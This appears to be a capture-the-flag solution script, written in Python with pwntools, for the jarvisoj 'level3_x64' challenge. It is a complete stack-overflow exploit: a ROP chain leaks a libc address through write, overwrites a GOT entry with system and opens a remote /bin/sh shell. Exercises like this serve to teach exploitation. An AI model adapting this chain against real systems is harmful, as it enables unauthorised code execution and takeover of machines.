from pwn import *
context.log_level = 'debug'

cn = remote('pwn2.jarvisoj.com', 9883)
#cn = process('level3_x64')
bin = ELF('level3_x64')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.19.so')
p_rdi_ret = 0x00000000004006b3
p_rsi_r15_ret = 0x00000000004006b1
p_bss = bin.bss()

cn.recv()
pay = 'a'*0x80 + 'bbbbbbbb'

pay += p64(p_rdi_ret) + p64(1)
pay += p64(p_rsi_r15_ret) + p64(bin.got['write']) + p64(0)
pay += p64(bin.symbols['write'])

pay += p64(p_rdi_ret) + p64(0)
pay += p64(p_rsi_r15_ret) + p64(bin.got['__libc_start_main']) + p64(0)
pay += p64(bin.symbols['read'])

pay += p64(p_rdi_ret) + p64(0)
pay += p64(p_rsi_r15_ret) + p64(p_bss) + p64(0)
pay += p64(bin.symbols['read'])

pay += p64(p_rdi_ret) + p64(p_bss)
pay += p64(bin.plt['__libc_start_main'])

cn.sendline(pay)
#raw_input()

p_write = u64(cn.recv(8))
cn.recv()
print 'p_write:'+hex(p_write)
p_system = p_write - libc.symbols['write'] + libc.symbols['system']
print 'p_system:'+hex(p_system)
cn.sendline(p64(p_system))
cn.sendline('/bin/sh\0')
cn.interactive()

